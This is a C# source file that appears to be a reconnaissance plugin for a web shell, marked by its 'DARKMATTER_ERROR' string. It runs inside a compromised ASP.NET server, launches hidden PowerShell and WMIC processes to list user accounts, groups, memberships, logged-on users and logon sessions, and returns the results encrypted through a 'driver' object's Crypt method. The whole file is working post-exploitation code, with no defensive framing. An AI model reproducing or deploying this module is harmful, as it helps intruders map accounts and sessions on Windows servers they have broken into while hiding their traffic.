using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.Text.RegularExpressions;

public class win_users
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();
            Dictionary<string, string> dic = fnParseParams(szParam);

            StringBuilder sb = new StringBuilder();
            
            Dictionary<string, object> result = new Dictionary<string, object>();
            result["success"] = false;
            result["error"] = "";
            result["data"] = null;

            try
            {
                Dictionary<string, object> data = new Dictionary<string, object>();
                data["user_accounts"] = fnGetData("Get-CimInstance Win32_UserAccount | Format-List *", "Win32_UserAccount");
                data["user_profiles"] = fnGetData("Get-CimInstance Win32_UserProfile | Format-List *", "Win32_UserProfile");
                data["groups"] = fnGetData("Get-CimInstance Win32_Group | Format-List *", "Win32_Group");
                data["group_users"] = fnGetData("Get-CimInstance Win32_GroupUser | Format-List *", "Win32_GroupUser");
                data["logged_on"] = fnGetData("Get-CimInstance Win32_LoggedOnUser | Format-List *", "Win32_LoggedOnUser");
                data["logon_session"] = fnGetData("Get-CimInstance Win32_LogonSession | Format-List *", "Win32_LogonSession");

                result["data"] = data;
                result["success"] = true;
            }
            catch (Exception ex)
            {
                result["error"] = ex.Message;
            }

            sb.Append(fnToJson(result, 0));

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));

        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }

    private bool fnHasPowerShell()
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo("powershell", "-NoProfile -Command \"Get-Host\"")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process proc = Process.Start(psi))
            {
                proc.WaitForExit();
                return proc.ExitCode == 0;
            }
        }
        catch (Exception)
        {
            return false;
        }
    }

    private string fnCleanValue(string v)
    {
        if (v == null)
            return "";

        return Regex.Replace(v, @"[\p{C}&&[^\s]]", "").Trim();
    }

    private List<Dictionary<string, string>> fnGetData(string psQuery, string wmicClass)
    {
        if (fnHasPowerShell())
        {
            List<Dictionary<string, string>> psData = fnRunPowerShell(psQuery);
            if (psData != null && psData.Count > 0)
            {
                return psData;
            }
        }
        return fnParseWMIC(wmicClass);
    }

    private List<Dictionary<string, string>> fnRunPowerShell(string query)
    {
        List<Dictionary<string, string>> rows = new List<Dictionary<string, string>>();
        Dictionary<string, string> current = new Dictionary<string, string>();

        try
        {
            ProcessStartInfo psi = new ProcessStartInfo("powershell", "-NoProfile -Command \"" + query + "\"")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.UTF8
            };

            using (Process process = Process.Start(psi))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        line = line.Replace("\uFEFF", "").Trim();

                        if (string.IsNullOrEmpty(line))
                        {
                            if (current.Count > 0)
                            {
                                rows.Add(new Dictionary<string, string>(current));
                                current.Clear();
                            }
                            continue;
                        }

                        if (!line.Contains(":"))
                        {
                            continue;
                        }

                        int partsIdx = line.IndexOf(':');
                        string k = fnCleanValue(line.Substring(0, partsIdx));
                        string v = fnCleanValue(line.Substring(partsIdx + 1));

                        if (string.IsNullOrEmpty(k)) continue;
                        current[k] = v;
                    }
                }
                if (current.Count > 0)
                {
                    rows.Add(new Dictionary<string, string>(current));
                }
                process.WaitForExit();
            }
        }
        catch (Exception)
        {
            return new List<Dictionary<string, string>>();
        }
        return rows;
    }

    private List<Dictionary<string, string>> fnParseWMIC(string wmicClass)
    {
        List<Dictionary<string, string>> rows = new List<Dictionary<string, string>>();
        Dictionary<string, string> current = new Dictionary<string, string>();

        try
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", string.Format("/c wmic path {0} get /format:list", wmicClass))
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.GetEncoding(950)
            };

            using (Process process = Process.Start(psi))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        line = line.Replace("\uFEFF", "").Trim();

                        if (string.IsNullOrEmpty(line))
                        {
                            if (current.Count > 0)
                            {
                                rows.Add(new Dictionary<string, string>(current));
                                current.Clear();
                            }
                            continue;
                        }

                        if (!line.Contains("="))
                        {
                            continue;
                        }

                        int partsIdx = line.IndexOf('=');
                        string k = fnCleanValue(line.Substring(0, partsIdx));
                        string v = fnCleanValue(line.Substring(partsIdx + 1));

                        if (string.IsNullOrEmpty(k)) continue;
                        current[k] = v;
                    }
                }

                if (current.Count > 0)
                {
                    rows.Add(new Dictionary<string, string>(current));
                }
                process.WaitForExit();
            }
        }
        catch (Exception)
        {
            return new List<Dictionary<string, string>>();
        }
        return rows;
    }

    private string fnToJson(object obj, int indentLevel)
    {
        string indent = new string(' ', indentLevel * 2);
        string nextIndent = new string(' ', (indentLevel + 1) * 2);

        if (obj == null)
        {
            return "null";
        }
        if (obj is bool)
        {
            return obj.ToString().ToLower();
        }
        if (obj is string)
        {
            return "\"" + fnEscapeJsonString((string)obj) + "\"";
        }
        if (obj is System.Collections.IDictionary)
        {
            System.Collections.IDictionary map = (System.Collections.IDictionary)obj;
            if (map.Count == 0) return "{}";

            StringBuilder sb = new StringBuilder("{\n");
            var it = map.GetEnumerator();
            bool isFirst = true;

            while (it.MoveNext())
            {
                if (!isFirst)
                {
                    sb.Append(",\n");
                }
                isFirst = false;
                sb.Append(nextIndent)
                  .Append("\"").Append(fnEscapeJsonString(it.Key.ToString())).Append("\": ")
                  .Append(fnToJson(it.Value, indentLevel + 1));
            }
            sb.Append("\n").Append(indent).Append("}");
            return sb.ToString();
        }
        if (obj is System.Collections.IList)
        {
            System.Collections.IList list = (System.Collections.IList)obj;
            if (list.Count == 0) return "[]";

            StringBuilder sb = new StringBuilder("[\n");
            for (int i = 0; i < list.Count; i++)
            {
                sb.Append(nextIndent).Append(fnToJson(list[i], indentLevel + 1));
                if (i < list.Count - 1)
                {
                    sb.Append(",");
                }
                sb.Append("\n");
            }
            sb.Append(indent).Append("]");
            return sb.ToString();
        }

        return "\"" + fnEscapeJsonString(obj.ToString()) + "\"";
    }

    private string fnEscapeJsonString(string str)
    {
        if (str == null) return "";
        return str.Replace("\\", "\\\\")
                  .Replace("\"", "\\\"")
                  .Replace("\b", "\\b")
                  .Replace("\f", "\\f")
                  .Replace("\n", "\\n")
                  .Replace("\r", "\\r")
                  .Replace("\t", "\\t");
    }
}